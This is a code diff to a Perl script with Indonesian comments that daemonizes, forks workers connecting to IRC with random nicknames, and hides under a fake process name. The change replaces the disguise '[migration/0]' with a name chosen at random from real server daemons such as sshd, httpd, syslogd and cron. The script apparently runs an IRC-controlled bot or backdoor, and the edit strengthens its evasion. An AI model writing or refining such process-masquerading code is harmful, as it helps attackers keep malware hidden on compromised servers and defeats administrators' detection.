@@ -15,6 +15,20 @@ my $pid_file = '/dev/shm/qe3.pid';
 # Path ke skrip ini
 my $script_path = rel2abs($0);
 
+# Daftar nama proses
+my @rps = ("/usr/local/apache/bin/httpd -DSSL",
+           "/usr/sbin/httpd -k start -DSSL",
+           "/usr/sbin/httpd",
+           "/usr/sbin/sshd -i",
+           "/usr/sbin/sshd",
+           "/usr/sbin/sshd -D",
+           "/usr/sbin/apache2 -k start",
+           "/sbin/syslogd",
+           "/sbin/klogd -c 1 -x -x",
+           "/usr/sbin/acpid",
+           "/usr/sbin/cron");
+my $process = $rps[rand scalar @rps];
+
 # Fungsi untuk membuat nickname acak
 sub generate_random_nick {
     my @chars = ('A'..'Z', 'a'..'z', '0'..'9');
@@ -126,7 +140,7 @@ check_if_already_running();
 daemonize();
 
 # Ubah nama proses
-set_process_name("[migration/0]");
+set_process_name($process);
 
 # Membuat file PID
 create_pid_file();
@@ -138,7 +152,7 @@ if (!defined $pid) {
 
 if ($pid == 0) {
     # Ubah nama proses anak
-    set_process_name("[migration/0]");
+    set_process_name($process);
 
     # Ini adalah proses anak, jalankan proses utama Anda di sini
     my $socket = connect_to_irc();
@@ -177,7 +191,7 @@ if ($pid == 0) {
             $pid = fork();
             if ($pid == 0) {
                 # Ubah nama proses anak
-                set_process_name("[migration/0]");
+                set_process_name($process);
 
                 my $socket = connect_to_irc();
                 my $connected = 0;
